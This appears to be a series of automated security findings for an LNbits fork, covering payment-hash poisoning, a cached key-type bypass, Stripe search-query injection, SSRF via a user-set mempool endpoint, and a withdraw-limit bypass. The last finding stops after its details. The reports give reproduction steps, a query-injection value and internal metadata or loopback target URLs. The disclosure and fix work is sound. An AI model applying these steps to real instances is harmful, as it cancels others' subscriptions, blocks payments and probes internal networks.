# Instance-wide payment_hash deduplication lets any user block other wallets' payment of an external invoice or receive another wallet's Payment record

## Details
Outgoing-payment deduplication in `_pay_external_invoice` is keyed on the Lightning payment hash across the whole instance rather than per wallet. Before creating a payment it calls `get_standalone_payment(checking_id)` with no wallet filter (crud/payments.py:37-69, matching `checking_id = X OR payment_hash = X` in any wallet). If any record exists, `_verify_external_payment` decides the outcome for the *current* caller from that foreign record: a pending record raises 'Payment is still pending', a successful one 'Payment already paid', a failed one asks the funding source for the status of that hash and raises 'Payment is failed node, retrying is not possible' when the backend reports failed (LND TrackPaymentV2 FAILED, CLN listpays 'failed' or no pays); when the backend reports pending/unknown the foreign wallet's `Payment` object is returned to the caller with HTTP 201 as if it were their own. `create_payment` (crud/payments.py:256-260) enforces the same instance-wide uniqueness.

Because `_validate_payment_request` only requires a decodable BOLT11 and takes `payment_hash` and `amount_msat` from it, and the BOLT11 `p` tag is not bound to the signing key, any self-registered user can encode a BOLT11 carrying a target invoice's payment hash H with a 1-sat amount and an unroutable payee, sign it with their own key, and POST it with their wallet admin key to /api/v1/payments. `check_internal(H)` finds nothing for an external invoice, so a record `checking_id = H` is created in the attacker's wallet; the backend attempt fails (or times out / is held), leaving a FAILED or PENDING record that does not debit the attacker.

From then on every other wallet on the instance that tries to pay the genuine invoice H takes the `old_payment` branch and is either refused with 520 (backend reports the attacker's attempt as failed or pending), or receives 201 with the attacker's `Payment` record (wallet_id, memo, extra, labels, webhook, fee) while nothing was paid, which misleads integrations treating 2xx as success. Targets are any external invoice whose hash the attacker learns before the victim pays: static donation/merchant invoices, invoices shown on public pages or in chats, invoices of competing services. Internal (same-instance) invoices are protected by the bolt11 comparison in `_pay_internal_invoice`; external ones are not. tests/unit/test_pay_invoice.py exercises the retry branch only from the same wallet, so the cross-wallet effect is untested.

## Evidence
1. [lnbits/core/services/payments.py:897–900](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L897-L900)
   _pay_external_invoice looks up an existing record by checking_id (= the invoice payment_hash) via get_standalone_payment with no wallet filter; if any wallet has a record for that hash it skips creating a payment and delegates the outcome for the current caller to _verify_external_payment on the other wallet's record.
2. [lnbits/core/crud/payments.py:37–69](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/payments.py#L37-L69)
   get_standalone_payment matches `checking_id = X OR payment_hash = X` across all wallets when wallet_id is None (ORDER BY amount LIMIT 1 prefers the most negative, i.e. an outgoing attempt), so a record created by an unrelated wallet is returned.
3. [lnbits/core/services/payments.py:1100–1125](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L1100-L1125)
   _verify_external_payment raises 'Payment is still pending' / 'Payment already paid' / 'failed node, retrying is not possible' (HTTP 520 via exceptions.py:136-142) based solely on the foreign record and the funding source's view of that hash, or returns the foreign wallet's Payment object (wallet_id, memo, extra, labels, webhook) to the caller as a 201 when the backend reports pending/unknown.
4. [lnbits/core/crud/payments.py:256–260](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/payments.py#L256-L260)
   create_payment independently refuses any new record whose checking_id matches an existing record in any wallet ('Payment already exists'), so the hash namespace is shared instance-wide even though the table's uniqueness is UNIQUE(wallet, payhash) (migrations.py:59); a per-wallet fix must change this check too.
5. [lnbits/core/services/payments.py:1147–1174](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L1147-L1174)
   _validate_payment_request accepts any decodable BOLT11 and takes payment_hash and amount_msat from it; the `p` tag is not bound to the signer, so an attacker can mint a 1-sat BOLT11 carrying a victim invoice's payment_hash signed with their own key (tests/unit/test_pay_invoice.py::test_invoice_changed shows bolt11 2.1.1 decode accepts a re-encoded invoice whose signature no longer matches the original payee).
6. [lnbits/core/services/payments.py:882–907](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L882-L907)
   The outgoing record is created with checking_id = payment_hash in the attacker's wallet; when the funding source fails (unroutable payee) the record stays FAILED (lines 945-949) or, on timeout/hold, PENDING, and the attacker's balance is not debited for a FAILED outgoing payment, so poisoning costs nothing.
7. [lnbits/core/views/payment\_api.py:280–319](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/payment_api.py#L280-L319)
   Entry point: POST /api/v1/payments with `out: true` and any wallet admin key calls pay_invoice with the caller-supplied payment_request; every self-registered account gets a wallet with an admin key (lnbits_allow_new_accounts defaults to True).

## Impact
Confidentiality: the foreign wallet's Payment record (wallet_id, memo, extra, labels, webhook URL, fee) is disclosed to an unrelated caller when the backend reports pending/unknown for the poisoned hash. Integrity: callers can be told their payment completed (201 with a Payment) when nothing was paid. Availability: payment of a chosen external invoice is blocked instance-wide for every other wallet until the invoice is reissued; no funds are lost and no wallet keys are exposed.

## Reproduction steps
1. Attacker self-registers (lnbits_allow_new_accounts defaults True; create_user_account creates a wallet with an admin key), funds it with a few sats (1 sat + 2 sat default fee reserve), learns a target BOLT11 payment hash H, encodes a 1-sat BOLT11 with `p` = H and an unroutable payee signed with an arbitrary key, and POSTs it with `out: true` to /api/v1/payments. bolt11 2.1.1 (pinned) recovers the payee key from the signature and does not bind the payment hash to it (assumption consistent with the project's own test_invoice_changed, which re-encodes a tampered invoice and reaches the service layer). The funding source fails to route, leaving a FAILED record keyed H in the attacker's wallet; any later payer of the genuine invoice on this instance is refused or handed the attacker's record. No special configuration is needed and the attack works over the network with a basic account.

## Recommended fix
1. Duplicate-payment detection in _pay_external_invoice consults records belonging to other wallets, so one wallet's attempt dictates the outcome for every other wallet paying the same hash and can return another wallet's Payment object. Fix criteria: The pre-payment lookup in _pay_external_invoice must be scoped to the paying wallet (source_wallet_id); a record created by a different wallet must neither short-circuit the new attempt nor be returned to the caller. Verify by creating a FAILED/PENDING record for hash H in wallet A and confirming wallet B can still attempt H and never receives A's record.
2. create_payment enforces instance-wide uniqueness of checking_id via get_standalone_payment with no wallet filter, so even a per-wallet lookup upstream would be refused with 'Payment already exists'. Fix criteria: Outgoing records must be unique per (wallet_id, checking_id) as the schema already allows; create_payment's duplicate check must be scoped to the wallet, and any funding-source checking_id collision across wallets must be handled without one wallet's record blocking another's.
3. The payment_hash supplied in an attacker-signed BOLT11 is trusted as a globally unique key for the ledger. Fix criteria: Cross-wallet lookups by payment hash must be limited to the internal-invoice matching path that also compares the full bolt11 string and amount; no other code path may treat a caller-supplied hash as identifying a record outside the caller's wallet.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Improper authorization
**CWE:** [CWE-639](https://cwe.mitre.org/data/definitions/639.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257383

---

# LightKeyChecker cache hit skips expected key type check; invoice key passes as admin

## Details
The light (cached) wallet-key dependency enforces the required key type only when the cache misses. `LightKeyChecker.__call__` computes `cache_key = f"auth:x-api-key:{key_value}"` and, if an entry exists, returns it after only `_check_user_access` (decorators.py:162-166). The check `if self.expected_key_type is KeyType.admin and wallet.adminkey != key_value: raise 403` lives in `_extract_key_type`, which is only reached on the miss path (line 178). Because `require_base_admin_key` and `require_base_invoice_key` are distinct checker instances sharing one cache namespace, any call that first validates an *invoice* key through a `require_base_invoice_key` endpoint stores `BaseWalletTypeInfo(key_type=invoice, wallet)` for `auth_authentication_cache_minutes` (default 10 min). A subsequent request with the same invoice key to a `require_base_admin_key` endpoint hits the cache and is accepted without the admin check.

Attack: a holder of a wallet's *invoice key* (the key that is routinely embedded in public-facing apps and is designed as receive/read-only) does (1) `POST /api/v1/payments` with `X-API-KEY: <inkey>` to create an invoice — this populates the cache; (2) `PUT /api/v1/payments/{payment_hash}/labels` with the same invoice key — `require_base_admin_key` returns the cached info and the handler runs. In this repository the only admin-light consumer is the labels endpoint, so the concrete in-repo impact is modifying payment labels and appending labels to the wallet owner's account (`update_user_account`) — an integrity breach of the invoice-key/admin-key boundary, but a limited one. However `require_base_admin_key` is part of the public decorator API that installed Python extensions use for spend-level operations, and for any such endpoint this bug grants admin-level access to invoice-key holders. The maintainers' tests (tests/api/test_wallet_key_access.py) exercise cached auth but never a key-type downgrade through the cache.

The non-cached `KeyChecker` is not affected. The bug also means the cached path never re-validates `expected_key_type` for admin keys either, but that direction is harmless.

## Evidence
1. [lnbits/decorators.py:155–184](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/decorators.py#L155-L184)
   LightKeyChecker.__call__ builds cache_key = f"auth:x-api-key:{key_value}" (line 157), a namespace shared by every LightKeyChecker regardless of expected_key_type. On a hit (lines 162-166) it runs only _check_user_access and returns the cached BaseWalletTypeInfo; _extract_key_type — the sole place `expected_key_type is KeyType.admin and wallet.adminkey != key_value` raises 403 (lines 107-115) — executes only on the miss path (line 178). The entry is written with the key_type computed for the *first* endpoint that saw the key (lines 179-183).
2. [lnbits/decorators.py:199–232](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/decorators.py#L199-L232)
   require_base_admin_key and require_base_invoice_key instantiate LightKeyChecker differing only in expected_key_type, so an entry warmed by the invoice-key dependency satisfies the admin-key dependency.
3. [lnbits/core/views/payment\_api.py:331–362](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/payment_api.py#L331-L362)
   PUT /api/v1/payments/{payment_hash}/labels is guarded only by Depends(require_base_admin_key) and never inspects key_type.key_type. With a cached invoice key it rewrites `payment.labels` of any payment in the wallet (including the owner's outgoing payments) and appends new UserLabel entries to the owner's account via update_user_account.
4. [lnbits/core/views/payment\_api.py:280–282](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/payment_api.py#L280-L282)
   POST /api/v1/payments (and GET /api/v1/payments at line 101) use require_base_invoice_key; an invoice-key request here stores BaseWalletTypeInfo(key_type=invoice) under the shared cache key, warming it for the admin-only endpoint.
5. [lnbits/settings.py:952](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L952)
   auth_authentication_cache_minutes defaults to 10 (ge=0), so the cached path — and the bypass — is active in the default configuration; only an operator setting it to 0 disables LightKeyChecker caching.

## Impact
The only in-repo require_base_admin_key consumer is the payment-labels endpoint, so the confirmed gain is rewriting labels on any payment of the wallet (including outgoing payments the invoice key could never create) and appending labels to the wallet owner's account record — an integrity breach across the invoice↔admin key boundary with low impact; no confidentiality or availability effect. The root defect removes the admin/invoice distinction for every endpoint built on require_base_admin_key, so installed Python extensions using it for spend-level operations would raise this to funds impact; rated on the in-repo path.

## Reproduction steps
1. Attacker holds only a wallet invoice key — a position the design treats as receive/read-only and that is routinely embedded in public-facing apps. Two ordinary HTTP requests: one to any require_base_invoice_key endpoint (e.g. GET or POST /api/v1/payments) to warm the cache, then PUT /api/v1/payments/{hash}/labels with the same key within auth_authentication_cache_minutes (default 10). No race, no user interaction, default configuration.

## Recommended fix
The expected-key-type enforcement in LightKeyChecker is coupled to the cache-miss path, while the cache key ignores which key type the endpoint requires, so cached entries created by a less-privileged check satisfy a more-privileged one. Fix criteria: On every call, including cache hits, the checker must verify that the presented key satisfies expected_key_type (an invoice key must be rejected with 403 wherever an admin key is required). Verify: warm the cache with an invoice key on POST /api/v1/payments, then call PUT /api/v1/payments/{hash}/labels with the same key within the cache window and confirm 403.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Auth bypass
**CWE:** [CWE-863](https://cwe.mitre.org/data/definitions/863.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257378

---

# Stripe subscription cancel builds search query from user input, letting any wallet cancel any subscription

## Details
StripeWallet.cancel_subscription (lnbits/fiat/stripe.py:243-267) locates the Stripe subscription to cancel with the Stripe Search API (GET /v1/subscriptions/search). The query string is assembled with f-string interpolation of two values: correlation_id (the caller's wallet id) and subscription_id, which is the raw `{subscription_id}` path parameter of `DELETE /api/v1/fiat/{provider}/subscription/{subscription_id}` (lnbits/core/views/fiat_api.py:170-185). That route is gated only by require_admin_key (lnbits/decorators.py:187-196, KeyChecker), i.e. the admin key of any wallet, which every self-registered LNbits user has for their own wallets. No middleware in lnbits/app.py or lnbits/middleware.py constrains the path segment; Starlette hands the percent-decoded segment to the handler.

The metadata the query matches on is written by LNbits itself at subscription creation (stripe.py:198-204: `subscription_data[metadata][wallet_id]`, `[subscription_request_id]`, taken from FiatSubscriptionPaymentOptions) and read back by the invoice.paid webhook (callback_api.py:217-229), so the `metadata['wallet_id']` clause is the only thing binding the cancel to the caller's own wallet — exactly what FiatProvider.cancel_subscription's docstring (base.py:185-191) says correlation_id is for.

Stripe's search query language quotes values with single/double quotes and combines clauses with AND / OR (and `-` negation). Nothing in LNbits escapes `'`, spaces or operators in subscription_id, so a caller can terminate the quoted literal and append a clause. Example path parameter (URL-encoded `x'%20OR%20status:'active`), producing the query

  metadata['wallet_id']:'<attacker-wallet>' AND metadata['subscription_request_id']:'x' OR status:'active'

which, under the ordinary precedence of AND over OR, matches every active subscription in the operator's Stripe account. The code takes `data[0]` and issues `DELETE /v1/subscriptions/{id}` with the operator's secret key, cancelling a subscription belonging to another LNbits user (or to the operator's non-LNbits customers). Repeating the request cancels them one by one; a targeted variant appends `OR metadata['wallet_id']:'<victim wallet id>'`. The caller never needs to know a real subscription id. httpx 0.27.2 (uv.lock) form-encodes `params=` so the full string reaches Stripe intact — the same encoding the legitimate query already relies on.

The response to the attacker is only ok/error, so this is an integrity attack: irreversible cancellation of other parties' recurring payments in the operator's Stripe account (Stripe does not allow reactivating a cancelled subscription). Preconditions: the operator has enabled the Stripe fiat provider (settings.stripe_enabled, the feature under attack, not a hardening control).

Explicit assumptions about the remote service, not verifiable in this checkout: (1) Stripe's Search Query Language accepts `OR` between clauses and evaluates `A AND B OR C` as `(A AND B) OR C`, as documented; (2) `status` and `metadata[...]` are searchable fields for /v1/subscriptions/search (both documented). If Stripe gave OR higher precedence than AND the injected clause would stay bound to the attacker's wallet and the gain would be nil.

The PayPal sibling (lnbits/fiat/paypal.py) has a different defect — it does not check ownership at all — filed separately.

## Evidence
1. [lnbits/fiat/stripe.py:243–267](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/fiat/stripe.py#L243-L267)
   cancel_subscription builds the Stripe Search query by f-string interpolation of correlation_id (the caller's wallet id) and the caller-supplied subscription_id: "metadata['wallet_id']:'{correlation_id}' AND metadata['subscription_request_id']:'{subscription_id}'" with no neutralisation of the single quote or of the AND/OR/- operators of Stripe's query language. The first search hit (data[0]) is then DELETEd via /v1/subscriptions/{id} with the operator's secret key. A subscription_id of x' OR status:'active closes the quoted literal and appends an OR clause, so the result set is no longer bound to the caller's wallet and a stranger's subscription is cancelled.
2. [lnbits/core/views/fiat\_api.py:170–185](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/fiat_api.py#L170-L185)
   DELETE /api/v1/fiat/{provider}/subscription/{subscription_id} is reachable with any wallet admin key (require_admin_key, i.e. any self-registered user's own wallet). The raw path parameter is passed unmodified to fiat_provider.cancel_subscription together with the caller's wallet id as correlation_id; the wallet id is the only ownership control and it is defeated by the injection.
3. [lnbits/fiat/base.py:178–192](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/fiat/base.py#L178-L192)
   The abstract contract states correlation_id is 'used to verify that the subscription belongs to the user that made the request'. The Stripe implementation's only enforcement of that is the injectable search clause.

## Impact
LNbits itself: the route is misused as a confused deputy; no LNbits data is disclosed (only ok/error returned) and no LNbits ledger entries change directly, but the fiat subscription feature's ownership guarantee is broken, so limited integrity impact on the LNbits component. Subsequent-system impact: The operator's Stripe account: the code demonstrably issues DELETE /v1/subscriptions/{id} for subscriptions selected by attacker-controlled search criteria, so an attacker can irreversibly cancel any or all subscriptions in the merchant account, including those of other LNbits users and of customers unrelated to LNbits.

## Reproduction steps
1. Attacker: any self-registered LNbits user holding the admin key of their own wallet (require_admin_key accepts any wallet's admin key). They send DELETE /api/v1/fiat/stripe/subscription/<payload> where payload is a URL-encoded string containing a single quote and an OR clause (e.g. `x' OR status:'active`). LNbits forwards the unescaped string inside the Stripe search query under the operator's Stripe secret key and deletes the first match. No race, no victim interaction, no non-default configuration beyond the Stripe provider being enabled (the feature itself). Assumes, as stated in the description, that Stripe's search grammar accepts OR with AND-over-OR precedence (documented behaviour of a remote service, not verifiable here) and that httpx 0.27.2 form-encodes the query parameter (the legitimate query already depends on this).

## Recommended fix
User-controlled subscription_id (and wallet id) are interpolated into the Stripe search query without neutralising quote characters or query operators, so the ownership clause can be bypassed. Fix criteria: The subscription lookup must be bound to the caller's wallet regardless of the content of subscription_id: either validate subscription_id against a strict allow-list format (e.g. UUID / Stripe id charset) before use, or avoid search entirely by resolving the subscription from LNbits' own stored mapping (payment.extra.subscription_request_id / external_id for the caller's wallet) and verifying metadata.wallet_id on the fetched Stripe object before deleting. Verify that a subscription_id containing quotes/OR clauses cannot cause a subscription of another wallet to be cancelled.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Query injection
**CWE:** [CWE-943](https://cwe.mitre.org/data/definitions/943.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** HIGH
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257191

---

# Per-wallet mempool_endpoint lets any registered user make LNbits send HTTP requests to loopback/LAN/metadata hosts (SSRF)

## Details
Every on-chain wallet carries its own OnchainConfig whose mempool_endpoint is set by the wallet's admin key via PUT /api/v1/wallet/onchain/config (lnbits/core/views/wallet_api.py:338-366). Any self-registered user obtains such a key by creating a wallet with wallet_type='onchain' (wallet_api.py:238-275; no setting gates on-chain wallet creation, only lnbits_allow_onchain_payments gates server signing). The validator in OnchainConfig (lnbits/core/models/wallets.py:312-327) only requires an http(s) URL with a hostname and no credentials/query/fragment; it does not restrict host, port or resolved IP range, and explorer_provider can be set to 'mempool' explicitly so the server-side Electrum provider is not used.

MempoolExplorer (lnbits/core/services/blockexplorer.py:218-230) builds an httpx.AsyncClient (httpx~=0.27.2) with base_url derived directly from that string and issues GET api/v1/fees/recommended, GET api/tx/{txid}/hex, GET api/address/{addr}/utxo|txs, GET api/blocks/tip/height, GET api/block-height/{h} and POST api/tx. Routes in lnbits/core/views/onchain_api.py drive these on demand:
- GET /api/v1/onchain/fees (386-397) returns client.fees() == response.json() verbatim, so any 2xx JSON body served by an internal host at <prefix>/api/v1/fees/recommended is disclosed; this works even on an unconfigured on-chain wallet because get_onchain_wallet does not require onchain_wallet_kind.
- GET /api/v1/onchain/tx/{txid}/hex (400-418) returns the body (up to 8 MB) when it is hexadecimal.
- POST /api/v1/onchain/tx (184-208) sends data.tx_hex, an arbitrary 1-8,000,000 character string with no hex validation, as the POST body to <prefix>/api/tx.
- For a configured watch-only wallet (any xpub), the periodic sync (lnbits/core/services/onchain.py:554-591; sync_wallets scheduled every 60 s from lnbits/app.py:587) contacts the host with no further user request.

The attacker chooses scheme (http/https), host, port and a path prefix; the request path always ends in one of the fixed mempool API suffixes and base_url concatenation cannot strip them, so read-back is limited to services answering at those suffixes, but connection-refused vs 15 s timeout vs 2xx/4xx (503 vs 400) is observable, giving loopback/LAN/Docker-network/cloud-metadata host and port discovery from the LNbits server's network position, plus a controllable POST body to any internal <prefix>/api/tx. follow_redirects=False and trust_env=False, so redirects and proxies are not a factor.

This contradicts the project's own shipped stance for user-supplied URLs: payment webhooks (notifications.py:479-483, lnbits_callback_allow_private_ips default False), LNURL targets (services/lnurl.py:450-458, lnbits_lnurl_allow_private_ips default False) and the WASM HTTP host API (wasm_ext/client/http.py:154-158) all resolve the host and reject non-global addresses by default. docs/guide/wallets_onchain.md:80 states 'Localhost and LAN URLs are supported for self-hosted Mempool instances'; that documents an operator convenience for single-operator deployments, not a decision that untrusted tenants on a multi-user instance (registration is open by default) may reach the server's internal network, and no operator opt-in exists to fence it as the sibling paths do. The fix must therefore preserve the documented localhost/LAN support behind an operator setting rather than remove it.

This finding records lead x-oc-01, which was left open for this seam.

## Evidence
1. [lnbits/core/services/blockexplorer.py:218–230](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/blockexplorer.py#L218-L230)
   MempoolExplorer.__init__ builds httpx.AsyncClient(base_url=mempool_url(config, network) + '/', timeout=15, follow_redirects=False, trust_env=False) directly from the stored per-wallet mempool_endpoint. No DNS resolution, is_global check or operator allow-list is applied here or anywhere on this path; this is the sink the fix must guard.
2. [lnbits/core/models/wallets.py:305–327](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/wallets.py#L305-L327)
   OnchainConfig.mempool_endpoint validator accepts any http(s) URL with a hostname and no credentials/query/fragment: loopback, RFC1918, link-local, cloud-metadata hosts and any port pass. explorer_provider may be set to 'mempool' explicitly so the server-side Electrum (LnbitsExplorer) path is bypassed.
3. [lnbits/core/views/wallet\_api.py:338–366](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/wallet_api.py#L338-L366)
   PUT /api/v1/wallet/onchain/config stores the OnchainConfig for the caller's own on-chain wallet under require_onchain_admin (the wallet's admin key) and immediately calls request_scan. Any registered user obtains such a key by POST /api/v1/wallet with wallet_type='onchain' (lines 238-275, no setting gates on-chain wallet creation).
4. [lnbits/core/views/onchain\_api.py:386–397](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/onchain_api.py#L386-L397)
   GET /api/v1/onchain/fees opens explorer_client(wallet.onchain_config, ...) and returns client.fees() verbatim; for the mempool provider that is response.json() of GET <endpoint>/api/v1/fees/recommended on the user-chosen host, echoing any 2xx JSON body to the caller. get_onchain_wallet does not require onchain_wallet_kind, so an unconfigured on-chain wallet suffices.
5. [lnbits/core/views/onchain\_api.py:184–208](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/onchain_api.py#L184-L208)
   POST /api/v1/onchain/tx passes data.tx_hex (any string up to 8,000,000 chars, no hex check) to client.broadcast, which POSTs it as the raw body to <endpoint>/api/tx on the attacker-chosen host; the only post-condition is a 64-hex response, so the request is sent regardless.
6. [lnbits/core/views/onchain\_api.py:400–418](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/onchain_api.py#L400-L418)
   GET /api/v1/onchain/tx/{txid}/hex returns the raw response body of GET <endpoint>/api/tx/{txid}/hex (up to 8 MB) when it is hexadecimal: a second read-back channel.
7. [lnbits/core/services/blockexplorer.py:318–336](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/blockexplorer.py#L318-L336)
   utxos/fees/raw_transaction/broadcast issue GET/POST requests relative to the attacker-chosen base URL and return the body; checkpoint/block_hash/history (236-307) issue further GETs during scans.
8. [lnbits/core/services/onchain.py:554–591](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/onchain.py#L554-L591)
   _scan uses the same explorer_client for every configured (watch-only, any xpub) on-chain wallet; sync_wallets (406-409) is scheduled every 60 s from lnbits/app.py:587, so the server contacts the attacker-chosen host unattended.
9. [lnbits/core/services/notifications.py:470–483](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/notifications.py#L470-L483)
   The project's shipped control for user-supplied URLs that the explorer path omits: webhook callbacks resolve the host and reject non-global addresses unless lnbits_callback_allow_private_ips is set (same pattern in services/lnurl.py:450-458 and wasm_ext/client/http.py:154-158).

## Impact
Confidentiality: internal service responses are returned only when they are 2xx JSON at a path ending in /api/v1/fees/recommended or hex at /api/tx/{id}/hex, plus host/port reachability via 503-vs-400 and timing; the fixed path suffixes bound this to LOW. Integrity: an attacker-chosen body up to 8 MB is POSTed to an attacker-chosen internal URL ending in /api/tx, LOW. Availability: none beyond ordinary request load. Subsequent-system impact: Requests originate from the LNbits host and reach services behind its network boundary (loopback, container network, LAN, cloud metadata) that the attacker cannot otherwise address. Read-back is constrained to fixed path suffixes and content shapes, and the POST body lands only on a /api/tx path, so impact on those systems is limited reconnaissance and blind POST rather than compromise.

## Reproduction steps
1. A self-registered user (registration open by default) creates a wallet with wallet_type='onchain' (no gating), calls PUT /api/v1/wallet/onchain/config?network=Mainnet with explorer_provider='mempool' and mempool_endpoint='http://169.254.169.254' or 'http://127.0.0.1:PORT/prefix', then calls GET /api/v1/onchain/fees (JSON echoed), GET /api/v1/onchain/tx/<64hex>/hex, or POST /api/v1/onchain/tx with an arbitrary body. Configuring a watch-only wallet with any xpub additionally makes the 60 s sync fire requests unattended. Only the wallet's own admin key is required; no victim interaction, no non-default configuration.

## Recommended fix
1. OnchainConfig.mempool_endpoint, a URL authored by any wallet admin key holder, is used as the base URL for server-side HTTP requests without checking that the resolved target is a global address or is explicitly allowed by the operator, unlike every other user-supplied URL the server fetches (webhooks, LNURL, WASM HTTP), which are default-denied for non-global addresses. Fix criteria: Before storing and again before each use, the explorer host must resolve only to global unicast addresses unless an operator setting (e.g. lnbits_callback_allow_private_ips or a dedicated explorer allow-list) permits private targets, and the connection must be pinned to the validated address so a DNS answer cannot change between check and connect. The documented localhost/LAN self-hosted Mempool use case must remain available behind that operator opt-in. Verify by setting mempool_endpoint to loopback, RFC1918, link-local and metadata addresses (and hostnames resolving to them) with the opt-in unset: the config update or the request must be rejected and GET /api/v1/onchain/fees, GET /api/v1/onchain/tx/{txid}/hex, POST /api/v1/onchain/tx and the periodic scan must not reach the target.
2. POST /api/v1/onchain/tx forwards data.tx_hex to the explorer without checking that it is a hexadecimal transaction, giving the attacker a free-form POST body to the chosen host. Fix criteria: The broadcast route must reject bodies that are not valid hexadecimal (and preferably not parseable as a transaction) before contacting any explorer. Verify that a non-hex tx_hex returns 400 without an outbound request.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Server-side request forgery
**CWE:** [CWE-918](https://cwe.mitre.org/data/definitions/918.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** LOW
**Subsequent system integrity impact:** LOW
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257186

---

# Send-only shared wallet key bypasses per-wallet daily withdraw and spacing limits

## Details
LNbits lets an operator cap how fast funds leave a wallet with two settings: lnbits_wallet_limit_daily_max_withdraw (max sats withdrawn per wallet per day) and lnbits_wallet_limit_secs_between_trans (minimum spacing between payments). Both are enforced in check_wallet_limits(), which is called from _check_wallet_for_payment() with the wallet id derived from the API key. For a shared wallet that id is the mirror wallet's id, not the owner's source wallet id.

check_wallet_daily_withdraw_limit() and check_time_limit_between_transactions() obtain prior payments via get_payments(wallet_id=...). get_payments resolves the wallet and, if wallet.can_view_payments is False, returns an empty result. A mirror wallet whose share grants only send-payments (no view-payments) therefore always looks like it has no payments at all, and both limit checks return early. Immediately afterwards _pay_from_wallet() passes the can_send_payments check and debits wallet.source_wallet_id, i.e. the owner's wallet.

